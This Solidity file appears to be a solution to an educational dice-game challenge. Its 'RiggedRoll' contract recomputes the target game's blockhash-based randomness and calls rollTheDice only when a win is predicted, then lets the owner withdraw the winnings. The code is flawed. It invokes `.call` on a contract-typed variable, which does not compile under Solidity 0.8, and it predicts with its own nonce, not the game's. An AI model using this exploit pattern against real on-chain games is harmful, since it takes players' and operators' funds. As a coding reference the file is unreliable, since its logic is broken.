pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    uint256 public nonce = 0;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw() public onlyOwner {
        (bool sent, ) = msg.sender.call{ value: address(this).balance }("");
        require(sent, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "The contract balance is not enough.");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
        uint256 roll = uint256(hash) % 16;
        console.log("\t", "   Dice Game Roll by RiggedRoll:", roll);

        if (roll > 5) {
            return;
        }

        (bool success, ) = diceGame.call{ value: 0.002 ether }(abi.encodeWithSignature("rollTheDice()"));
        require(success, "Failed to call rollTheDice()");

        nonce++;
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
